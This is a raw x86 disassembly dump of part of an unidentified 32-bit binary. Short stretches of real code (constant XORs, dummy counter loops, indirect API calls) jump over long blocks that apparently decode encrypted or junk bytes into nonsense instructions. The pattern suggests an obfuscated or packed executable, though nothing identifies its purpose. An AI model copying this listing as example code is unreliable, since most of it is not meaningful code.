  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx+0x1110d044]
  40e122:	cmp    DWORD PTR [eax+ebp*2-0x3c8f8f5a],0x6c70707f
  40e12d:	daa    
  40e12e:	inc    ebx
  40e12f:	adc    ebx,DWORD PTR [ebx]
  40e131:	lahf   
  40e132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e133:	or     eax,0xdc462649
  40e138:	cmp    eax,0xc7b9c6d4
  40e13d:	jg     0x40e182
  40e13f:	ret    0xdb1a
  40e142:	mov    dh,0xfc
  40e144:	or     BYTE PTR [eax+0x53],ah
  40e147:	fst    st(1)
  40e149:	fwait
  40e14a:	iret   
  40e14b:	fwait
  40e14c:	clc    
  40e14d:	aad    0xc2
  40e14f:	push   ss
  40e150:	cmp    esi,edi
  40e152:	cmp    ch,BYTE PTR [ebx+0x5a]
  40e155:	je     0x40e0f8
  40e157:	or     al,dh
  40e159:	dec    edx
  40e15a:	push   ds
  40e15b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e15c:	data16 repnz in al,dx
  40e15f:	jle    0x40e1ab
  40e161:	add    al,BYTE PTR ds:0x8331ce61
  40e167:	gs in  al,0x49
  40e16a:	inc    edx
  40e16b:	mov    bl,BYTE PTR [edi+ecx*4]
  40e16e:	mov    cl,0xf8
  40e170:	imul   esi,DWORD PTR [edi],0xffffffc9
  40e173:	aad    0x3c
  40e175:	add    esp,DWORD PTR [edx+0xa53f55e]
  40e17b:	xor    DWORD PTR [eax-0x19],edx
  40e17e:	pop    ebp
  40e17f:	call   0x4574cace
  40e184:	loopne 0x40e14a
  40e186:	xchg   edi,eax
  40e187:	mov    esi,0x9a50d2a9
  40e18c:	jno    0x40e1d2
  40e18e:	xor    al,0x15
  40e190:	out    dx,al
  40e191:	cld    
  40e192:	adc    al,0x98
  40e194:	ins    BYTE PTR es:[edi],dx
  40e195:	mov    ecx,DWORD PTR [esi]
  40e197:	and    BYTE PTR [ecx+0x5c521e62],cl
  40e19d:	dec    esp
  40e19e:	loop   0x40e179
  40e1a0:	adc    dl,al
  40e1a2:	repz das 
  40e1a4:	adc    eax,0x81a60b5
  40e1a9:	mov    BYTE PTR [edx-0x52ba50ca],al
  40e1af:	sub    al,0xf4
  40e1b1:	pop    ebx
  40e1b2:	xor    DWORD PTR [ecx-0x5d],eax
  40e1b5:	xchg   esp,eax
  40e1b6:	add    al,0xea
  40e1b8:	stos   DWORD PTR es:[edi],eax
  40e1b9:	out    dx,al
  40e1ba:	pop    edi
  40e1bb:	xchg   esi,eax
  40e1bc:	xor    ebx,DWORD PTR [eax+ecx*4]
  40e1bf:	call   0x80a12bfd
  40e1c4:	xor    al,0x7
  40e1c6:	or     al,0xe0
  40e1c8:	int    0xc0
  40e1ca:	outs   dx,BYTE PTR ds:[esi]
  40e1cb:	test   al,0x23
  40e1cd:	fwait
  40e1ce:	daa    
  40e1cf:	jmp    0x40e1ac
  40e1d1:	out    0x7a,eax
  40e1d3:	sbb    BYTE PTR [eax],bl
  40e1d5:	or     BYTE PTR [edi+0x6a],0xb1
  40e1d9:	inc    edi
  40e1da:	js     0x40e166
  40e1dc:	ins    DWORD PTR es:[edi],dx
  40e1dd:	mov    ebp,0x4cd5886a
  40e1e2:	test   DWORD PTR [edi+0x4e4fdec1],esp
  40e1e8:	dec    edx
  40e1e9:	xor    esp,DWORD PTR [edx+0x56668993]
  40e1ef:	or     DWORD PTR [ecx],edi
  40e1f1:	sub    ebx,DWORD PTR [ebx]
  40e1f3:	(bad)  
  40e1f4:	mov    edx,0xcccacfb1
  40e1f9:	push   eax
  40e1fa:	fild   DWORD PTR [edx+ecx*8]
  40e1fd:	mov    al,0xb2
  40e1ff:	push   ss
  40e200:	sub    al,0xce
  40e202:	sub    al,0xb1
  40e204:	and    al,0x2e
  40e206:	(bad)  
  40e207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e208:	sbb    cl,al
  40e20a:	scas   al,BYTE PTR es:[edi]
  40e20b:	jmp    0x4298e790
  40e210:	jge    0x40e1a0
  40e212:	pop    ecx
  40e213:	sub    BYTE PTR [edx-0x64],ch
  40e216:	pop    ss
  40e217:	adc    eax,0xcb3c1bcd
  40e21c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e21d:	cmp    ebp,DWORD PTR [edx+0x8def89b]
  40e223:	add    BYTE PTR [ebx],dl
  40e225:	pop    edx
  40e226:	mov    ecx,0xba7f4fe1
  40e22b:	dec    edx
  40e22c:	push   cs
  40e22d:	cmp    DWORD PTR [ecx-0x1b9592c9],0x7a0a2d53
  40e237:	aad    0x35
  40e239:	or     bl,cl
  40e23b:	popa   
  40e23c:	ja     0x40e232
  40e23e:	sar    DWORD PTR [ecx],cl
  40e240:	dec    ebp
  40e241:	adc    esp,DWORD PTR [edi]
  40e243:	std    
  40e244:	aam    0x6b
  40e246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e247:	push   es
  40e248:	mov    edi,0x3772e1f3
  40e24d:	mov    gs,WORD PTR [ecx-0x58eec1f4]
  40e253:	adc    ch,BYTE PTR [ecx-0x6017f696]
  40e259:	pop    ds
  40e25a:	mov    ds:0x4576bec9,al
  40e25f:	aad    0xff
  40e261:	or     ch,BYTE PTR [edx-0x5d]
  40e264:	push   0xc9c53551
  40e269:	mov    ebp,ebx
  40e26b:	cmp    al,0xe8
  40e26d:	inc    ecx
  40e26e:	sub    ch,cl
  40e270:	ret    
  40e271:	xchg   edx,eax
  40e272:	test   BYTE PTR ds:0xdc17519d,0x8b
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	xor    bl,ch
  40e378:	out    0x5,eax
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e309
  40e383:	fistp  WORD PTR [edi]
  40e385:	lods   eax,DWORD PTR ds:[esi]
  40e386:	xor    eax,0xeb329c0a
  40e38b:	iret   
  40e38c:	dec    edi
  40e38d:	ja     0x40e37e
  40e38f:	push   edi
  40e390:	sub    DWORD PTR [esi],edx
  40e392:	add    BYTE PTR ds:0xcd142a4,al
  40e398:	sub    dh,BYTE PTR [eax+eiz*1-0x14]
  40e39c:	iret   
  40e39d:	inc    eax
  40e39e:	mov    dl,0x4c
  40e3a0:	cmp    al,0xfb
  40e3a2:	pop    esi
  40e3a3:	mov    dh,0xf1
  40e3a5:	mov    DWORD PTR [esi-0x7b],0xc5d0978c
  40e3ac:	push   esi
  40e3ad:	cmc    
  40e3ae:	fbstp  TBYTE PTR [edi-0x48]
  40e3b2:	and    ecx,DWORD PTR [edx+0x44]
  40e3b5:	in     eax,0x5b
  40e3b7:	shl    BYTE PTR [eax],1
  40e3b9:	adc    DWORD PTR [edi],ebx
  40e3bb:	test   BYTE PTR [edi],ah
  40e3bd:	add    al,0xd5
  40e3bf:	shl    BYTE PTR [esi+0x2f],1
  40e3c2:	add    BYTE PTR [ebp-0x17cac380],bh
  40e3c8:	inc    ebx
  40e3c9:	test   BYTE PTR [ebx+eiz*4-0x3d],ah
  40e3cd:	jl     0x40e426
  40e3cf:	aas    
  40e3d0:	enter  0x5b28,0x38
  40e3d4:	jle    0x40e3de
  40e3d6:	frstor [ebx]
  40e3d8:	test   eax,0xd582b864
  40e3dd:	leave  
  40e3de:	fsubp  st(5),st
  40e3e0:	jb     0x40e424
  40e3e2:	mov    ebx,0x135dfc81
  40e3e7:	das    
  40e3e8:	outs   dx,BYTE PTR ds:[esi]
  40e3e9:	pop    ebx
  40e3ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3eb:	sbb    al,0x3a
  40e3ed:	and    eax,0xf334388e
  40e3f2:	aaa    
  40e3f3:	jmp    0x750b43f7
  40e3f8:	push   0x845f087b
  40e3fd:	les    ebp,FWORD PTR [esp+ebp*8+0x1ae85fb7]
  40e404:	mov    ch,0x6a
  40e406:	push   eax
  40e407:	je     0x40e423
  40e409:	or     dh,bh
  40e40b:	shl    DWORD PTR ds:[ebp+0x2d],0x3
  40e410:	je     0x40e3f8
  40e412:	xchg   esp,eax
  40e413:	mov    ecx,0x1c3ea420
  40e418:	sbb    BYTE PTR ds:0x5000d257,0xf5
  40e41f:	cs mov dh,0xbc
  40e422:	add    eax,esp
  40e424:	out    0x86,al
  40e426:	call   0xaddb:0xdf24c74d
  40e42d:	xor    bl,ch
  40e42f:	or     dl,BYTE PTR [edx+0x8]
  40e432:	rcl    BYTE PTR [ecx],1
  40e434:	add    DWORD PTR [ecx],0x3658f34d
  40e43a:	push   ebp
  40e43b:	scas   eax,DWORD PTR es:[edi]
  40e43c:	pop    es
  40e43d:	mov    ds:0x3ccda896,al
  40e442:	mov    bh,0x8d
  40e444:	shl    BYTE PTR [esi],1
  40e446:	ret    
  40e447:	mov    eax,DWORD PTR [ecx-0x2b]
  40e44a:	push   ecx
  40e44b:	div    al
  40e44d:	(bad)  
  40e44e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e44f:	lea    eax,[eax+0x28dfc0b9]
  40e455:	cmp    DWORD PTR [ebp+0x7d3626f1],edx
  40e45b:	outs   dx,DWORD PTR ds:[esi]
  40e45c:	(bad)  
  40e45d:	js     0x40e42c
  40e45f:	push   esi
  40e460:	mov    esi,0xdfb9ebda
  40e465:	sti    
  40e466:	in     eax,dx
  40e467:	(bad)  
  40e468:	xchg   edi,eax
  40e469:	cdq    
  40e46a:	retf   0xa463
  40e46d:	sbb    edx,DWORD PTR [esi-0x68]
  40e470:	cmp    al,0xf4
  40e472:	pusha  
  40e473:	sti    
  40e474:	scas   al,BYTE PTR es:[edi]
  40e475:	cmp    DWORD PTR [bx],edi
  40e478:	out    0x36,eax
  40e47a:	pop    edi
  40e47b:	pop    ebp
  40e47c:	iret   
  40e47d:	test   DWORD PTR gs:[ecx],0xde63cf64
  40e484:	add    al,0x4f
  40e486:	ins    DWORD PTR es:[edi],dx
  40e487:	cmp    ebp,ebp
  40e489:	shl    DWORD PTR [esi],0x6d
  40e48c:	and    ecx,DWORD PTR [ebx+0x5a6a1d14]
  40e492:	adc    BYTE PTR [ecx-0x44],dh
  40e495:	push   cs
  40e496:	jmp    0x40e458
  40e498:	dec    ebx
  40e499:	stc    
  40e49a:	xor    dh,BYTE PTR [esi+0x68]
  40e49d:	cmc    
  40e49e:	xchg   ebp,eax
  40e49f:	fs or  eax,0x8897e765
  40e4a5:	push   esp
  40e4a6:	jnp    0x40e51b
  40e4a8:	test   BYTE PTR [esi],ch
  40e4aa:	outs   dx,DWORD PTR ds:[esi]
  40e4ab:	into   
  40e4ac:	pusha  
  40e4ad:	mov    eax,0x90bd2d93
  40e4b2:	sub    DWORD PTR [edi-0x22],0x44
  40e4b6:	jns    0x40e51c
  40e4b8:	dec    eax
  40e4b9:	dec    esi
  40e4ba:	push   ss
  40e4bb:	cli    
  40e4bc:	in     eax,0xb
  40e4be:	pop    ss
  40e4bf:	fstp   QWORD PTR [ebx]
  40e4c1:	xor    eax,0x277b5b06
  40e4c6:	stos   DWORD PTR es:[edi],eax
  40e4c7:	loope  0x40e48c
  40e4c9:	lea    eax,[ebx+0x27]
  40e4cc:	cwde   
  40e4cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4ce:	or     edi,eax
  40e4d0:	inc    ebp
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x549c740f
  40e4f5:	mov    al,0x3d
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	daa    
  40e500:	xchg   ecx,eax
  40e501:	mov    esp,0x422b0346
  40e506:	push   cs
  40e507:	sub    al,0x34
  40e509:	mov    DWORD PTR [edi-0x3c05aa1a],edi
  40e50f:	out    0x87,eax
  40e511:	ret    0x2151
  40e514:	mov    bl,0x7a
  40e516:	pusha  
  40e517:	ret    
  40e518:	cmp    BYTE PTR [edx+0x18],dh
  40e51b:	arpl   WORD PTR [ebp-0x5254c17e],si
  40e521:	ins    DWORD PTR es:[edi],dx
  40e522:	shr    DWORD PTR [ebx],0x29
  40e525:	sub    DWORD PTR [edi],esp
  40e527:	xchg   edx,eax
  40e528:	rcl    DWORD PTR [edx+ecx*1+0x7a151e83],cl
  40e52f:	lahf   
  40e530:	inc    esp
  40e531:	jne    0x40e52f
  40e533:	stos   DWORD PTR es:[edi],eax
  40e534:	mov    esp,0xca7d3364
  40e539:	fld    st(5)
  40e53b:	aaa    
  40e53c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e53d:	fs cmp ecx,edx
  40e540:	pop    ebx
  40e541:	out    0x8c,eax
  40e543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e544:	sub    dl,dh
  40e546:	add    cl,al
  40e548:	ss lahf 
  40e54a:	or     ebx,edx
  40e54c:	mul    ah
  40e54e:	pop    ebp
  40e54f:	mov    ch,0x77
  40e551:	jle    0x40e50e
  40e553:	sar    esp,cl
  40e555:	ins    BYTE PTR es:[edi],dx
  40e556:	mov    WORD PTR [ebx],gs
  40e558:	scas   eax,DWORD PTR es:[edi]
  40e559:	lahf   
  40e55a:	hlt    
  40e55b:	cmc    
  40e55c:	scas   eax,DWORD PTR es:[edi]
  40e55d:	push   edx
  40e55e:	sub    cl,cl
  40e560:	lea    eax,[edx+0x3bdd60b9]
  40e566:	mov    eax,ds:0x5c0ba18d
  40e56b:	mov    BYTE PTR [eiz*1-0x5b7fdc24],dl
  40e572:	mov    al,ds:0x10a225a2
  40e577:	das    
  40e578:	push   esi
  40e579:	je     0x40e56b
  40e57b:	cmp    DWORD PTR [ecx+0x369c59c9],0x7cc29b63
  40e585:	xor    esi,ecx
  40e587:	int    0x6d
  40e589:	enter  0x62b,0xf6
  40e58d:	shl    DWORD PTR [edi-0x41],cl
  40e590:	shl    ebp,0xd0
  40e593:	stos   BYTE PTR es:[edi],al
  40e594:	mov    dl,BYTE PTR [esi+0x43]
  40e597:	(bad)  
  40e598:	mov    ebx,edx
  40e59a:	sbb    eax,0xf08ff5fa
  40e59f:	out    0xa5,eax
  40e5a1:	(bad)  
  40e5a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5a3:	out    dx,eax
  40e5a4:	mov    es,WORD PTR ds:0x2d6cd03e
  40e5aa:	inc    ecx
  40e5ab:	daa    
  40e5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ad:	sub    ah,BYTE PTR [ebx+edx*4+0x16]
  40e5b1:	mov    al,0xc
  40e5b3:	out    dx,al
  40e5b4:	sar    BYTE PTR [eax+0x32],1
  40e5b7:	call   0x2e73:0x32361863
  40e5be:	mov    ds,ebx
  40e5c0:	mov    eax,0xf6d9a4f7
  40e5c5:	xor    esi,DWORD PTR [edx]
  40e5c7:	xor    DWORD PTR [ebp+0x53],ebx
  40e5ca:	dec    esp
  40e5cb:	xchg   edi,eax
  40e5cc:	pop    ss
  40e5cd:	push   ecx
  40e5ce:	retf   
  40e5cf:	in     al,dx
  40e5d0:	cmp    DWORD PTR [ecx],0x26e0abfb
  40e5d6:	fsub   DWORD PTR [esi]
  40e5d8:	je     0x40e657
  40e5da:	test   DWORD PTR [ecx+0x2f],ebx
  40e5dd:	mov    DWORD PTR gs:[edi-0x6ab14139],esi
  40e5e4:	cmp    BYTE PTR [eax-0xbc5fdfe],dl
  40e5ea:	ins    BYTE PTR es:[edi],dx
  40e5eb:	aad    0xa1
  40e5ed:	shr    BYTE PTR [ebp+0x2a5e88d1],1
  40e5f3:	icebp  
  40e5f4:	mov    ds:0x41e7a708,eax
  40e5f9:	imul   ecx,DWORD PTR [ecx],0xffffffe6
  40e5fc:	dec    edx
  40e5fd:	iret   
  40e5fe:	dec    esp
  40e5ff:	out    0xd7,al
  40e601:	jle    0x40e5f0
  40e603:	fsub   DWORD PTR [ecx-0x51]
  40e606:	push   ecx
  40e607:	adc    dl,BYTE PTR [ebx+0x19]
  40e60a:	pop    ds
  40e60b:	xchg   ebx,eax
  40e60c:	and    eax,edx
  40e60e:	stos   DWORD PTR es:[edi],eax
  40e60f:	mov    eax,ds:0x3ef17c4d
  40e614:	xlat   BYTE PTR ds:[ebx]
  40e615:	push   ebx
  40e616:	mov    ah,0xce
  40e618:	dec    ebx
  40e619:	shr    DWORD PTR [ecx+0x4],1
  40e61c:	cmp    esp,ebx
  40e61e:	push   ds
  40e61f:	ror    ebx,1
  40e621:	mov    edi,0x172bca4c
  40e626:	aad    0x0
  40e628:	pop    eax
  40e629:	push   ebx
  40e62a:	sbb    cl,BYTE PTR [eax]
  40e62c:	mov    DWORD PTR [ebp-0x61ff0d0e],edi
  40e632:	rcl    BYTE PTR [edx],cl
  40e634:	fild   WORD PTR es:[eax+0x951858a]
  40e63b:	or     DWORD PTR [edi],0x1e75607c
  40e641:	out    0x6,al
  40e643:	xchg   esi,eax
  40e644:	and    esp,DWORD PTR ds:[eax]
  40e647:	ja     0x40e5eb
  40e649:	push   edi
  40e64a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e64b:	pop    eax
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	ja     0x40e66f
  40e6dc:	push   ebp
  40e6dd:	jnp    0x40e730
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	xor    DWORD PTR [ebx],eax
  40e6e8:	daa    
  40e6e9:	in     al,0x51
  40e6eb:	mov    ah,0x1c
  40e6ed:	push   edi
  40e6ee:	es jmp 0x40e6e3
  40e6f1:	or     esi,DWORD PTR [esi-0x29ffff4f]
  40e6f7:	adc    al,0xc7
  40e6f9:	fidiv  DWORD PTR [ecx]
  40e6fb:	inc    ebx
  40e6fc:	add    ebp,DWORD PTR [esi]
  40e6fe:	cs push ebx
  40e700:	push   edx
  40e701:	cmp    BYTE PTR [esi],dl
  40e703:	rol    BYTE PTR [eax+ebp*8+0x4cc3553],0xb4
  40e70b:	or     DWORD PTR [eax-0x40],ecx
  40e70e:	icebp  
  40e70f:	cld    
  40e710:	adc    eax,0xfe29a088
  40e715:	out    dx,eax
  40e716:	xchg   edi,eax
  40e717:	imul   esi,DWORD PTR [edx+0x62f9c3a6],0xffffffac
  40e71e:	sub    eax,0x2b4af744
  40e723:	scas   eax,DWORD PTR es:[edi]
  40e724:	push   edi
  40e725:	jns    0x40e6b4
  40e727:	or     DWORD PTR ds:0xca0de8f,ecx
  40e72d:	call   0xb995:0x86da9b88
  40e734:	ret    0x20c0
  40e737:	int3   
  40e738:	cli    
  40e739:	xor    DWORD PTR [edi+0x62],edx
  40e73c:	retf   0x6b5a
  40e73f:	cmp    ch,BYTE PTR [esi+0x24516f6e]
  40e745:	popf   
  40e746:	in     eax,dx
  40e747:	fisubr WORD PTR [ebx+ebp*2]
  40e74a:	sbb    al,0xfe
  40e74c:	les    edi,FWORD PTR [ecx]
  40e74e:	inc    edx
  40e74f:	jae    0x40e7ab
  40e751:	push   ds
  40e752:	or     ecx,ecx
  40e754:	inc    ecx
  40e755:	(bad)  
  40e757:	lods   eax,DWORD PTR ds:[esi]
  40e758:	das    
  40e759:	lods   al,BYTE PTR ds:[si]
  40e75b:	call   0xbf8dad53
  40e760:	test   BYTE PTR [edx+0x7d765c86],ah
  40e766:	mov    al,0x55
  40e768:	jmp    0x40e7aa
  40e76a:	and    al,0x41
  40e76c:	lock fs mov eax,0xd980ce0c
  40e773:	cmp    al,0x15
  40e775:	fs mov ebp,0x821653b0
  40e77b:	jae    0x40e747
  40e77d:	(bad)  
  40e77e:	dec    edi
  40e77f:	leave  
  40e780:	loop   0x40e7a0
  40e782:	push   ebp
  40e783:	out    dx,eax
  40e784:	xor    BYTE PTR [edx+0x267d0b46],ah
  40e78a:	jp     0x40e7f9
  40e78c:	cmp    cl,0xf3
  40e78f:	xor    eax,0x2d6e47f1
  40e794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e795:	ret    
  40e796:	fld    TBYTE PTR gs:[edi+0x7a]
  40e79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e79b:	xor    DWORD PTR [ebx-0x66],edx
  40e79e:	(bad)  
  40e79f:	lods   eax,DWORD PTR ds:[esi]
  40e7a0:	(bad)  
  40e7a2:	push   edx
  40e7a3:	dec    ecx
  40e7a4:	test   BYTE PTR [ebp+0x11],cl
  40e7a7:	fnstsw WORD PTR [ebx-0x1db7c842]
  40e7ad:	setno  BYTE PTR [eax+0x45]
  40e7b1:	push   ecx
  40e7b2:	bound  ebx,QWORD PTR [ebp-0x6d6622c3]
  40e7b8:	push   ebp
  40e7b9:	test   eax,0xa78cda32
  40e7be:	pop    ecx
  40e7bf:	neg    BYTE PTR ds:0xd7f1da6a
  40e7c5:	jns    0x40e7cd
  40e7c7:	mov    edx,0xf7cc45cc
  40e7cc:	loop   0x40e7cd
  40e7ce:	push   eax
  40e7cf:	push   esp
  40e7d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7d2:	push   eax
  40e7d3:	pop    ebp
  40e7d4:	mov    al,cl
  40e7d6:	ret    0x1ef0
  40e7d9:	dec    ebx
  40e7da:	cmp    bl,BYTE PTR [esi-0x7f]
  40e7dd:	sbb    eax,DWORD PTR [edi-0x76]
  40e7e0:	pop    eax
  40e7e1:	hlt    
  40e7e2:	test   al,0xd7
  40e7e4:	inc    edx
  40e7e5:	mov    eax,0x1bc587b3
  40e7ea:	and    al,BYTE PTR [esi]
  40e7ec:	aad    0xed
  40e7ee:	std    
  40e7ef:	cld    
  40e7f0:	push   ebp
  40e7f1:	mov    bh,0xab
  40e7f3:	xchg   ebp,eax
  40e7f4:	data16 jno 0x40e7ff
  40e7f7:	out    0xf7,eax
  40e7f9:	push   esi
  40e7fa:	xchg   esi,ebp
  40e7fc:	sahf   
  40e7fd:	imul   edi,DWORD PTR [ebx-0x2f],0xa4477bce
  40e804:	or     esi,edx
  40e806:	mov    edx,0xcbed8dae
  40e80b:	cli    
  40e80c:	cld    
  40e80d:	(bad)  
  40e80f:	add    bl,BYTE PTR [ebx+esi*4+0x14625acf]
  40e816:	pop    ds
  40e817:	dec    edi
  40e818:	and    bl,BYTE PTR [ebx+esi*1]
  40e81b:	fwait
  40e81c:	cmp    eax,0x6d4bf1b2
  40e821:	sub    eax,0x67ddd890
  40e826:	lds    esi,FWORD PTR [esi+0x15]
  40e829:	repnz and DWORD PTR [ebx],edi
  40e82c:	jmp    0x8906ed59
  40e831:	jmp    0x40e8a7
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fce9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
